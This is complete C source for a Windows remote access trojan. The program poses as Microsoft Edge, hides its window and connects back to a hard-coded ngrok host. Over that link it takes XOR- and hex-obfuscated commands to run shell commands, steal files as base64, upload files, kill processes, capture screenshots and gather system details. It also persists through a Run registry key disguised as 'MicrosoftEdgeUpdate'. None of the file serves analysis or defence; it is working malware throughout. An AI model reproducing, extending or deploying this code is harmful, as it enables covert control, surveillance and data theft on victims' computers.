#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <iphlpapi.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <psapi.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")

#define KEY 0x3A
#define CWD_BUF_SIZE 1024

char current_dir[CWD_BUF_SIZE];

void XOR(char* data, size_t data_len) {
    for (size_t i = 0; i < data_len; i++)
        data[i] ^= KEY;
}

void HexEncode(const char* input, char* output, size_t input_len) {
    const char hex[] = "0123456789ABCDEF";
    for (size_t i = 0; i < input_len; i++) {
        output[i * 2] = hex[(input[i] >> 4) & 0xF];
        output[i * 2 + 1] = hex[input[i] & 0xF];
    }
    output[input_len * 2] = '\0';
}

int HexDecode(const char* input, char* output) {
    char buf[3] = {0};
    int len = strlen(input) / 2;
    for (int i = 0; i < len; i++) {
        buf[0] = input[i * 2];
        buf[1] = input[i * 2 + 1];
        output[i] = (char)strtol(buf, NULL, 16);
    }
    output[len] = '\0';
    return len;
}

void TrimNewlines(char* str) {
    char* end = str + strlen(str) - 1;
    while (end > str && (*end == '\n' || *end == '\r' || *end == ' '))
        *end-- = '\0';
}

int Base64Encode(const BYTE* input, DWORD input_len, char** output) {
    DWORD len = 0;
    if (!CryptBinaryToStringA(input, input_len, CRYPT_STRING_BASE64, NULL, &len))
        return -1;
    *output = (char*)malloc(len);
    if (!*output)
        return -1;
    if (!CryptBinaryToStringA(input, input_len, CRYPT_STRING_BASE64, *output, &len)) {
        free(*output);
        *output = NULL;
        return -1;
    }
    TrimNewlines(*output);
    return (int)len;
}

int Base64Decode(const char* input, BYTE** output, DWORD* output_len) {
    DWORD len = 0;
    if (!CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, NULL, &len, NULL, NULL))
        return -1;
    *output = (BYTE*)malloc(len);
    if (!*output)
        return -1;
    if (!CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, *output, &len, NULL, NULL)) {
        free(*output);
        *output = NULL;
        return -1;
    }
    *output_len = len;
    return 0;
}

int RunShell(const char* cmd, char* output, size_t output_size) {
    char full_cmd[8192];
    snprintf(full_cmd, sizeof(full_cmd), "cmd.exe /c %s 2>&1", cmd);

    FILE* fp = popen(full_cmd, "r");
    if (!fp) {
        snprintf(output, output_size, "Command execution failed\r\n");
        return -1;
    }

    size_t total = 0;
    char temp[1024];
    while (fgets(temp, sizeof(temp), fp)) {
        size_t len = strlen(temp);
        if (total + len >= output_size - 1)
            break;
        memcpy(output + total, temp, len);
        total += len;
    }

    int status = pclose(fp);

    if (total == 0) {
        snprintf(output, output_size, "Command completed (exit code: %d)\r\n", status);
        total = strlen(output);
    }

    return status;
}

void CmdLs(const char* path, char* output, size_t output_size) {
    char search_path[MAX_PATH];
    const char* dir = (path && strlen(path) > 0) ? path : current_dir;
    snprintf(search_path, sizeof(search_path), "%s\\*", dir);

    WIN32_FIND_DATAA ffd;
    HANDLE hFind = FindFirstFileA(search_path, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) {
        snprintf(output, output_size, "Error: cannot list directory '%s'\r\n", dir);
        return;
    }

    size_t pos = 0;
    pos += snprintf(output + pos, output_size - pos, "Directory listing: %s\r\n", dir);
    pos += snprintf(output + pos, output_size - pos, "%-30s %-10s %s\r\n", "Name", "Size", "Type");
    pos += snprintf(output + pos, output_size - pos, "%.80s\r\n", "----------------------------------------");

    do {
        if (strcmp(ffd.cFileName, ".") == 0 || strcmp(ffd.cFileName, "..") == 0)
            continue;
        const char* type = (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "<DIR>" : "    ";
        LARGE_INTEGER size;
        size.LowPart = ffd.nFileSizeLow;
        size.HighPart = ffd.nFileSizeHigh;
        char size_str[32];
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            snprintf(size_str, sizeof(size_str), "-");
        else
            snprintf(size_str, sizeof(size_str), "%lld", size.QuadPart);
        pos += snprintf(output + pos, output_size - pos, "%-30s %-10s %s\r\n", ffd.cFileName, size_str, type);
        if (pos >= output_size - 100)
            break;
    } while (FindNextFileA(hFind, &ffd) != 0);

    FindClose(hFind);
    output[pos] = '\0';
}

void CmdDownload(const char* path, char* output, size_t output_size) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        snprintf(output, output_size, "Error: cannot open file '%s'\r\n", path);
        return;
    }

    DWORD file_size = GetFileSize(hFile, NULL);
    if (file_size == INVALID_FILE_SIZE || file_size > 1024 * 1024 * 10) {
        CloseHandle(hFile);
        snprintf(output, output_size, "Error: file too large or inaccessible\r\n");
        return;
    }

    BYTE* buf = (BYTE*)malloc(file_size);
    if (!buf) {
        CloseHandle(hFile);
        snprintf(output, output_size, "Error: memory allocation failed\r\n");
        return;
    }

    DWORD read;
    if (!ReadFile(hFile, buf, file_size, &read, NULL) || read != file_size) {
        free(buf);
        CloseHandle(hFile);
        snprintf(output, output_size, "Error: read failed\r\n");
        return;
    }
    CloseHandle(hFile);

    char* b64 = NULL;
    if (Base64Encode(buf, file_size, &b64) < 0) {
        free(buf);
        snprintf(output, output_size, "Error: base64 encoding failed\r\n");
        return;
    }
    free(buf);

    snprintf(output, output_size, "[DOWNLOAD]%s|%s", path, b64);
    free(b64);
}

void CmdUpload(const char* arg, char* output, size_t output_size) {
    char path[MAX_PATH];
    const char* sep = strchr(arg, '|');
    if (!sep) {
        snprintf(output, output_size, "Error: invalid upload format. Use: upload <path>|<base64>\r\n");
        return;
    }

    size_t path_len = sep - arg;
    if (path_len >= sizeof(path)) path_len = sizeof(path) - 1;
    memcpy(path, arg, path_len);
    path[path_len] = '\0';

    const char* b64_data = sep + 1;

    BYTE* decoded = NULL;
    DWORD decoded_len = 0;
    if (Base64Decode(b64_data, &decoded, &decoded_len) < 0) {
        snprintf(output, output_size, "Error: base64 decode failed\r\n");
        return;
    }

    HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        free(decoded);
        snprintf(output, output_size, "Error: cannot write file '%s'\r\n", path);
        return;
    }

    DWORD written;
    if (!WriteFile(hFile, decoded, decoded_len, &written, NULL)) {
        CloseHandle(hFile);
        free(decoded);
        snprintf(output, output_size, "Error: write failed\r\n");
        return;
    }
    CloseHandle(hFile);
    free(decoded);

    snprintf(output, output_size, "Uploaded %lu bytes to %s\r\n", written, path);
}

void CmdPs(char* output, size_t output_size) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        snprintf(output, output_size, "Error: cannot enumerate processes\r\n");
        return;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    size_t pos = 0;
    pos += snprintf(output + pos, output_size - pos, "%-8s %-6s %-8s %s\r\n", "PID", "PPID", "Threads", "Name");
    pos += snprintf(output + pos, output_size - pos, "%.60s\r\n", "-----------------------------------------------------------");

    if (Process32First(hSnapshot, &pe)) {
        do {
            pos += snprintf(output + pos, output_size - pos, "%-8u %-6u %-8u %s\r\n",
                             pe.th32ProcessID, pe.th32ParentProcessID,
                             pe.cntThreads, pe.szExeFile);
            if (pos >= output_size - 100)
                break;
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    output[pos] = '\0';
}

void CmdKill(const char* pid_str, char* output, size_t output_size) {
    DWORD pid = atoi(pid_str);
    if (pid == 0) {
        snprintf(output, output_size, "Error: invalid PID\r\n");
        return;
    }

    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!hProcess) {
        snprintf(output, output_size, "Error: cannot open process %lu (maybe need admin)\r\n", pid);
        return;
    }

    if (TerminateProcess(hProcess, 1)) {
        snprintf(output, output_size, "Process %lu terminated\r\n", pid);
    } else {
        snprintf(output, output_size, "Error: failed to terminate process %lu\r\n", pid);
    }
    CloseHandle(hProcess);
}

void CmdScreenshot(char* output, size_t output_size) {
    int screen_x = GetSystemMetrics(SM_CXSCREEN);
    int screen_y = GetSystemMetrics(SM_CYSCREEN);

    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screen_x, screen_y);
    HGDIOBJ hOld = SelectObject(hdcMem, hBitmap);

    BitBlt(hdcMem, 0, 0, screen_x, screen_y, hdcScreen, 0, 0, SRCCOPY);
    SelectObject(hdcMem, hOld);

    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);

    BITMAPFILEHEADER bf;
    BITMAPINFOHEADER bi;
    memset(&bf, 0, sizeof(bf));
    memset(&bi, 0, sizeof(bi));

    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmp.bmWidth;
    bi.biHeight = bmp.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;

    DWORD img_size = ((bmp.bmWidth * 24 + 31) / 32) * 4 * abs(bmp.bmHeight);

    bf.bfType = 0x4D42;
    bf.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bf.bfSize = bf.bfOffBits + img_size;

    BYTE* img_buf = (BYTE*)malloc(img_size);
    if (!img_buf) {
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        snprintf(output, output_size, "Error: memory allocation failed\r\n");
        return;
    }

    GetDIBits(hdcScreen, hBitmap, 0, abs(bmp.bmHeight), img_buf, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    DWORD total_size = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + img_size;
    BYTE* bmp_buf = (BYTE*)malloc(total_size);
    if (!bmp_buf) {
        free(img_buf);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        snprintf(output, output_size, "Error: memory allocation failed\r\n");
        return;
    }

    memcpy(bmp_buf, &bf, sizeof(BITMAPFILEHEADER));
    memcpy(bmp_buf + sizeof(BITMAPFILEHEADER), &bi, sizeof(BITMAPINFOHEADER));
    memcpy(bmp_buf + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), img_buf, img_size);

    char* b64 = NULL;
    if (Base64Encode(bmp_buf, total_size, &b64) < 0) {
        free(bmp_buf);
        free(img_buf);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        snprintf(output, output_size, "Error: base64 encoding failed\r\n");
        return;
    }

    snprintf(output, output_size, "[SCREENSHOT]%dx%d|%s", screen_x, screen_y, b64);
    free(b64);
    free(bmp_buf);
    free(img_buf);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
}

void CmdSysinfo(char* output, size_t output_size) {
    OSVERSIONINFOEXA osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXA));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
    #pragma warning(push)
    #pragma warning(disable: 4996)
    GetVersionExA((LPOSVERSIONINFOA)&osvi);
    #pragma warning(pop)

    char comp_name[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD comp_name_size = sizeof(comp_name);
    GetComputerNameA(comp_name, &comp_name_size);

    char user_name[256];
    DWORD user_name_size = sizeof(user_name);
    GetUserNameA(user_name, &user_name_size);

    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);

    SYSTEM_INFO si;
    GetSystemInfo(&si);

    char cpu_name[49] = {0};
    int cpu_info[4] = {0};
    __asm__ __volatile__("cpuid" : "=a"(cpu_info[0]), "=b"(cpu_info[1]), "=c"(cpu_info[2]), "=d"(cpu_info[3]) : "a"(0x80000002));
    memcpy(cpu_name, cpu_info, sizeof(cpu_info));
    __asm__ __volatile__("cpuid" : "=a"(cpu_info[0]), "=b"(cpu_info[1]), "=c"(cpu_info[2]), "=d"(cpu_info[3]) : "a"(0x80000003));
    memcpy(cpu_name + 16, cpu_info, sizeof(cpu_info));
    __asm__ __volatile__("cpuid" : "=a"(cpu_info[0]), "=b"(cpu_info[1]), "=c"(cpu_info[2]), "=d"(cpu_info[3]) : "a"(0x80000004));
    memcpy(cpu_name + 32, cpu_info, sizeof(cpu_info));

    DWORD adapter_count = 0;
    ULONG buf_len = 0;
    GetAdaptersInfo(NULL, &buf_len);
    IP_ADAPTER_INFO* pAdapterInfo = (IP_ADAPTER_INFO*)malloc(buf_len);
    char ip_str[64] = "N/A";
    if (pAdapterInfo && GetAdaptersInfo(pAdapterInfo, &buf_len) == NO_ERROR) {
        IP_ADAPTER_INFO* p = pAdapterInfo;
        while (p) {
            if (p->IpAddressList.IpAddress.String[0] && strcmp(p->IpAddressList.IpAddress.String, "0.0.0.0") != 0) {
                snprintf(ip_str, sizeof(ip_str), "%s", p->IpAddressList.IpAddress.String);
                break;
            }
            p = p->Next;
        }
    }
    free(pAdapterInfo);

    size_t pos = 0;
    pos += snprintf(output + pos, output_size - pos, "System Information\r\n");
    pos += snprintf(output + pos, output_size - pos, "%.80s\r\n", "========================================");
    pos += snprintf(output + pos, output_size - pos, "Computer Name : %s\r\n", comp_name);
    pos += snprintf(output + pos, output_size - pos, "User          : %s\r\n", user_name);
    pos += snprintf(output + pos, output_size - pos, "OS            : Windows %d.%d Build %d\r\n",
                     osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
    pos += snprintf(output + pos, output_size - pos, "Architecture  : %s\r\n",
                     si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86");
    pos += snprintf(output + pos, output_size - pos, "CPU           : %s\r\n", cpu_name);
    pos += snprintf(output + pos, output_size - pos, "CPU Cores     : %u\r\n", si.dwNumberOfProcessors);
    pos += snprintf(output + pos, output_size - pos, "Memory Total  : %.2f GB\r\n",
                     (double)mem.ullTotalPhys / (1024.0 * 1024.0 * 1024.0));
    pos += snprintf(output + pos, output_size - pos, "Memory Avail  : %.2f GB\r\n",
                     (double)mem.ullAvailPhys / (1024.0 * 1024.0 * 1024.0));
    pos += snprintf(output + pos, output_size - pos, "IP Address    : %s\r\n", ip_str);
    pos += snprintf(output + pos, output_size - pos, "Working Dir   : %s\r\n", current_dir);
    output[pos] = '\0';
}

void CmdPersist(char* output, size_t output_size) {
    HKEY hkey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS) {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        if (RegSetValueExA(hkey, "MicrosoftEdgeUpdate", 0, REG_SZ,
                           (BYTE*)path, strlen(path)) == ERROR_SUCCESS) {
            snprintf(output, output_size, "Persistence installed at: %s\r\n", path);
        } else {
            snprintf(output, output_size, "Failed to set registry value\r\n");
        }
        RegCloseKey(hkey);
    } else {
        snprintf(output, output_size, "Failed to open registry key\r\n");
    }
}

void ProcessCommand(const char* cmd, char* output, size_t output_size) {
    if (strncmp(cmd, "!shell ", 7) == 0) {
        RunShell(cmd + 7, output, output_size);
    } else if (strncmp(cmd, "!cd ", 4) == 0) {
        const char* dir = cmd + 4;
        if (SetCurrentDirectoryA(dir)) {
            GetCurrentDirectoryA(CWD_BUF_SIZE, current_dir);
            snprintf(output, output_size, "Changed to: %s\r\n", current_dir);
        } else {
            snprintf(output, output_size, "Error: cannot change to '%s'\r\n", dir);
        }
    } else if (strcmp(cmd, "!pwd") == 0) {
        snprintf(output, output_size, "%s\r\n", current_dir);
    } else if (strncmp(cmd, "!ls", 3) == 0) {
        const char* path = cmd + 3;
        while (*path == ' ') path++;
        CmdLs(path, output, output_size);
    } else if (strncmp(cmd, "!download ", 10) == 0) {
        CmdDownload(cmd + 10, output, output_size);
    } else if (strncmp(cmd, "!upload ", 8) == 0) {
        CmdUpload(cmd + 8, output, output_size);
    } else if (strcmp(cmd, "!ps") == 0) {
        CmdPs(output, output_size);
    } else if (strncmp(cmd, "!kill ", 6) == 0) {
        CmdKill(cmd + 6, output, output_size);
    } else if (strcmp(cmd, "!screenshot") == 0) {
        CmdScreenshot(output, output_size);
    } else if (strcmp(cmd, "!sysinfo") == 0) {
        CmdSysinfo(output, output_size);
    } else if (strcmp(cmd, "!persist") == 0) {
        CmdPersist(output, output_size);
    } else if (strcmp(cmd, "!exit") == 0) {
        output[0] = '\0';
    } else {
        RunShell(cmd, output, output_size);
    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    SetConsoleTitleA("Microsoft Edge");
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    GetCurrentDirectoryA(CWD_BUF_SIZE, current_dir);

    ShellExecuteA(NULL, "open", "msedge.exe", NULL, NULL, SW_SHOWNORMAL);

    const char* host = "0.tcp.in.ngrok.io";
    const int port = 24754;

    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    struct hostent* remote;

    const size_t result_size = 16 * 1024 * 1024;
    const size_t hex_size = 32 * 1024 * 1024;
    char recv_buf[4096], cmd_buf[4096];
    char* result = (char*)malloc(result_size);
    char* hex_buf = (char*)malloc(hex_size + 2);

    if (!result || !hex_buf) {
        free(result);
        free(hex_buf);
        WSACleanup();
        return 1;
    }

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        free(result);
        free(hex_buf);
        return 1;
    }

    while (1) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            Sleep(5000);
            continue;
        }

        server.sin_family = AF_INET;
        server.sin_port = htons(port);
        remote = gethostbyname(host);
        if (!remote) {
            closesocket(sock);
            Sleep(5000);
            continue;
        }
        memcpy(&server.sin_addr, remote->h_addr_list[0], remote->h_length);

        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            closesocket(sock);
            Sleep(5000);
            continue;
        }

        while (1) {
            memset(recv_buf, 0, sizeof(recv_buf));
            memset(cmd_buf, 0, sizeof(cmd_buf));
            memset(result, 0, result_size);
            memset(hex_buf, 0, hex_size + 2);

            int bytes_recv = recv(sock, recv_buf, sizeof(recv_buf) - 1, 0);
            if (bytes_recv <= 0)
                break;

            TrimNewlines(recv_buf);

            int decoded_len = HexDecode(recv_buf, cmd_buf);
            if (decoded_len <= 0)
                continue;
            XOR(cmd_buf, decoded_len);
            TrimNewlines(cmd_buf);

            if (strcmp(cmd_buf, "!exit") == 0)
                break;

            ProcessCommand(cmd_buf, result, result_size);

            size_t result_len = strlen(result);
            if (result_len > 0) {
                XOR(result, result_len);
                HexEncode(result, hex_buf, result_len);
                int hex_len = strlen(hex_buf);
                // send_all: ensure all bytes are sent
                int total_sent = 0;
                hex_buf[hex_len] = '\n';
                int send_len = hex_len + 1;
                while (total_sent < send_len) {
                    int sent = send(sock, hex_buf + total_sent, send_len - total_sent, 0);
                    if (sent == SOCKET_ERROR)
                        break;
                    total_sent += sent;
                }
            }
        }

        closesocket(sock);
        Sleep(5000);
    }

    free(result);
    free(hex_buf);
    WSACleanup();
    return 0;
}
